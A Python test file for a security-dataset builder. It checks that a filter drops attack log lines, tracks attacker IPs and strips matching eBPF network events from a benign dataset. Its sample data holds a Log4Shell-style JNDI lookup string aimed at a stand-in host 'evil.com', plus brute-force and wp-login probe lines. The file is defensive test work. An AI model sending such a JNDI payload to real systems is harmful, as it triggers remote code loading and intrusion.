"""Tests for eBPF malicious traffic filtering in build_benign_v3.py."""

from __future__ import annotations

import sqlite3
import sys
from pathlib import Path

# Add scripts/ to path for imports
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

from build_benign_v3 import BenignV3Builder, MaliciousFilter, ScrubConfig
from security_gym.data.event_store import EventStore
from security_gym.parsers.base import ParsedEvent


# ── MaliciousFilter IP accumulation ──────────────────────────────────────


class TestMaliciousFilterIPTracking:
    """MaliciousFilter should accumulate IPs from filtered events."""

    def test_auth_log_filter_tracks_ip(self) -> None:
        event = ParsedEvent(
            timestamp="2026-03-20T12:00:00Z",
            source="auth_log",
            raw_line="Failed password for root from 10.0.0.99 port 22 ssh2",
            event_type="auth_failure",
            src_ip="10.0.0.99",
        )
        mf = MaliciousFilter()
        keep, rule = mf.check(event)
        assert keep is False
        assert "10.0.0.99" in mf.malicious_ips

    def test_web_access_filter_tracks_ip(self) -> None:
        event = ParsedEvent(
            timestamp="2026-03-20T12:00:00Z",
            source="web_access",
            raw_line='10.0.0.50 - - "GET /wp-login.php HTTP/1.1" 404 -',
            event_type="http_request",
            src_ip="10.0.0.50",
        )
        mf = MaliciousFilter()
        keep, _rule = mf.check(event)
        assert keep is False
        assert "10.0.0.50" in mf.malicious_ips

    def test_web_error_filter_tracks_ip(self) -> None:
        event = ParsedEvent(
            timestamp="2026-03-20T12:00:00Z",
            source="web_error",
            raw_line="client 10.0.0.77 ${jndi:ldap://evil.com/x}",
            event_type="error",
            src_ip="10.0.0.77",
        )
        mf = MaliciousFilter()
        keep, _rule = mf.check(event)
        assert keep is False
        assert "10.0.0.77" in mf.malicious_ips

    def test_benign_event_does_not_track_ip(self) -> None:
        event = ParsedEvent(
            timestamp="2026-03-20T12:00:00Z",
            source="auth_log",
            raw_line="Accepted publickey for keith from 192.168.1.10 port 12345 ssh2",
            event_type="auth_success",
            src_ip="192.168.1.10",
        )
        mf = MaliciousFilter()
        keep, _rule = mf.check(event)
        assert keep is True
        assert len(mf.malicious_ips) == 0

    def test_event_without_ip_does_not_crash(self) -> None:
        event = ParsedEvent(
            timestamp="2026-03-20T12:00:00Z",
            source="auth_log",
            raw_line="Failed password for nobody from somewhere",
            event_type="auth_failure",
            src_ip=None,
        )
        mf = MaliciousFilter()
        keep, _rule = mf.check(event)
        assert keep is False
        assert len(mf.malicious_ips) == 0

    def test_accumulates_multiple_ips(self) -> None:
        mf = MaliciousFilter()
        for ip in ["10.0.0.1", "10.0.0.2", "10.0.0.3"]:
            event = ParsedEvent(
                timestamp="2026-03-20T12:00:00Z",
                source="auth_log",
                raw_line=f"Failed password for root from {ip} port 22",
                event_type="auth_failure",
                src_ip=ip,
            )
            mf.check(event)
        assert mf.malicious_ips == {"10.0.0.1", "10.0.0.2", "10.0.0.3"}

    def test_syslog_events_pass_through(self) -> None:
        event = ParsedEvent(
            timestamp="2026-03-20T12:00:00Z",
            source="syslog",
            raw_line="Mar 20 12:00:00 server sshd[1234]: something",
            event_type="syslog",
            src_ip="10.0.0.99",
        )
        mf = MaliciousFilter()
        keep, _rule = mf.check(event)
        assert keep is True
        assert len(mf.malicious_ips) == 0


# ── eBPF carryover filtering ─────────────────────────────────────────────


def _create_ebpf_db(path: Path, events: list[dict]) -> None:
    """Create a minimal EventStore DB with eBPF events."""
    conn = sqlite3.connect(str(path))
    conn.execute("""
        CREATE TABLE events (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp     TEXT NOT NULL,
            source        TEXT NOT NULL,
            raw_line      TEXT NOT NULL,
            parsed        TEXT,
            is_malicious  INTEGER,
            campaign_id   TEXT,
            attack_type   TEXT,
            attack_stage  TEXT,
            severity      INTEGER,
            session_id    TEXT,
            src_ip        TEXT,
            username      TEXT,
            service       TEXT
        )
    """)
    for evt in events:
        conn.execute(
            """INSERT INTO events
               (timestamp, source, raw_line, parsed, is_malicious,
                session_id, src_ip, username, service)
               VALUES (?, ?, ?, ?, 0, ?, ?, ?, ?)""",
            (
                evt.get("timestamp", "2026-03-20T12:00:00Z"),
                evt["source"],
                evt.get("raw_line", "test ebpf event"),
                evt.get("parsed", "{}"),
                evt.get("session_id"),
                evt.get("src_ip"),
                evt.get("username"),
                evt.get("service"),
            ),
        )
    conn.commit()
    conn.close()


class TestEbpfCarryoverFiltering:
    """eBPF carryover should filter network events from malicious IPs."""

    def test_network_events_from_malicious_ip_filtered(self, tmp_path: Path) -> None:
        """ebpf_network events from known attacker IPs are dropped."""
        ebpf_db = tmp_path / "ebpf.db"
        output_db = tmp_path / "output.db"

        _create_ebpf_db(ebpf_db, [
            {"source": "ebpf_network", "src_ip": "10.0.0.99",
             "raw_line": "connect pid=100 10.0.0.99:8080"},
            {"source": "ebpf_network", "src_ip": "192.168.1.10",
             "raw_line": "connect pid=200 192.168.1.10:443"},
            {"source": "ebpf_process", "src_ip": None,
             "raw_line": "execve pid=300 comm=bash"},
        ])

        builder = BenignV3Builder(
            sources=[],
            output_path=output_db,
            scrub_config=ScrubConfig.empty(),
            ebpf_sources=[ebpf_db],
        )
        # Create empty output DB
        store = EventStore(output_db, mode="w")
        store.close()

        # Simulate having found a malicious IP during log filtering
        builder.mal_filter.malicious_ips.add("10.0.0.99")

        builder._carryover_ebpf()

        # Should have 2 events (1 network filtered out)
        conn = sqlite3.connect(str(output_db))
        rows = conn.execute("SELECT source, src_ip FROM events").fetchall()
        conn.close()

        assert len(rows) == 2
        sources = {r[0] for r in rows}
        assert "ebpf_network" in sources
        assert "ebpf_process" in sources
        # The malicious IP network event should be gone
        ips = [r[1] for r in rows if r[0] == "ebpf_network"]
        assert "10.0.0.99" not in ips
        assert "192.168.1.10" in ips

    def test_process_and_file_events_pass_through(self, tmp_path: Path) -> None:
        """ebpf_process and ebpf_file events always pass through."""
        ebpf_db = tmp_path / "ebpf.db"
        output_db = tmp_path / "output.db"

        _create_ebpf_db(ebpf_db, [
            {"source": "ebpf_process", "src_ip": None,
             "raw_line": "execve pid=100 comm=bash"},
            {"source": "ebpf_file", "src_ip": None,
             "raw_line": "openat pid=100 /etc/passwd"},
        ])

        builder = BenignV3Builder(
            sources=[],
            output_path=output_db,
            scrub_config=ScrubConfig.empty(),
            ebpf_sources=[ebpf_db],
        )
        store = EventStore(output_db, mode="w")
        store.close()

        # Even with malicious IPs populated, process/file events pass
        builder.mal_filter.malicious_ips.add("10.0.0.99")
        builder._carryover_ebpf()

        conn = sqlite3.connect(str(output_db))
        count = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        conn.close()
        assert count == 2

    def test_empty_malicious_ips_keeps_all(self, tmp_path: Path) -> None:
        """When no malicious IPs are known, all eBPF events are kept."""
        ebpf_db = tmp_path / "ebpf.db"
        output_db = tmp_path / "output.db"

        _create_ebpf_db(ebpf_db, [
            {"source": "ebpf_network", "src_ip": "10.0.0.99",
             "raw_line": "connect pid=100 10.0.0.99:8080"},
            {"source": "ebpf_network", "src_ip": "10.0.0.50",
             "raw_line": "accept pid=200 10.0.0.50:22"},
            {"source": "ebpf_process", "src_ip": None,
             "raw_line": "execve pid=300 comm=ls"},
        ])

        builder = BenignV3Builder(
            sources=[],
            output_path=output_db,
            scrub_config=ScrubConfig.empty(),
            ebpf_sources=[ebpf_db],
        )
        store = EventStore(output_db, mode="w")
        store.close()

        # No malicious IPs — internal server, all events benign
        builder._carryover_ebpf()

        conn = sqlite3.connect(str(output_db))
        count = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        conn.close()
        assert count == 3
        assert builder.ebpf_events_filtered == 0

    def test_multiple_ebpf_sources(self, tmp_path: Path) -> None:
        """Multiple --ebpf-source DBs are all processed."""
        db1 = tmp_path / "ebpf1.db"
        db2 = tmp_path / "ebpf2.db"
        output_db = tmp_path / "output.db"

        _create_ebpf_db(db1, [
            {"source": "ebpf_process", "raw_line": "execve pid=1"},
        ])
        _create_ebpf_db(db2, [
            {"source": "ebpf_file", "raw_line": "openat pid=2"},
            {"source": "ebpf_network", "src_ip": "10.0.0.1",
             "raw_line": "connect pid=3"},
        ])

        builder = BenignV3Builder(
            sources=[],
            output_path=output_db,
            scrub_config=ScrubConfig.empty(),
            ebpf_sources=[db1, db2],
        )
        store = EventStore(output_db, mode="w")
        store.close()

        builder._carryover_ebpf()

        conn = sqlite3.connect(str(output_db))
        count = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
        conn.close()
        assert count == 3
        assert builder.ebpf_events == 3

    def test_report_includes_filtered_count(self, tmp_path: Path) -> None:
        """Build report should include ebpf_events_filtered."""
        ebpf_db = tmp_path / "ebpf.db"
        output_db = tmp_path / "output.db"

        _create_ebpf_db(ebpf_db, [
            {"source": "ebpf_network", "src_ip": "10.0.0.99",
             "raw_line": "connect pid=100"},
        ])

        builder = BenignV3Builder(
            sources=[],
            output_path=output_db,
            scrub_config=ScrubConfig.empty(),
            ebpf_sources=[ebpf_db],
        )
        store = EventStore(output_db, mode="w")
        store.close()

        builder.mal_filter.malicious_ips.add("10.0.0.99")
        builder._carryover_ebpf()

        report = builder._build_report("abc123", {})
        assert report["ebpf_events_filtered"] == 1
        assert report["ebpf_events_carried_over"] == 0


# ── collect_ebpf_baseline.py standalone DB ────────────────────────────────


class TestCollectEbpfStandalone:
    """collect_ebpf_baseline.py should work without --source."""

    def test_fresh_db_created_without_source(self, tmp_path: Path) -> None:
        """When --source is omitted, a fresh empty EventStore is created."""
        output_db = tmp_path / "fresh.db"
        store = EventStore(output_db, mode="w")
        store.close()

        # Verify it's a valid EventStore with events table
        conn = sqlite3.connect(str(output_db))
        tables = [r[0] for r in conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table'"
        ).fetchall()]
        conn.close()
        assert "events" in tables
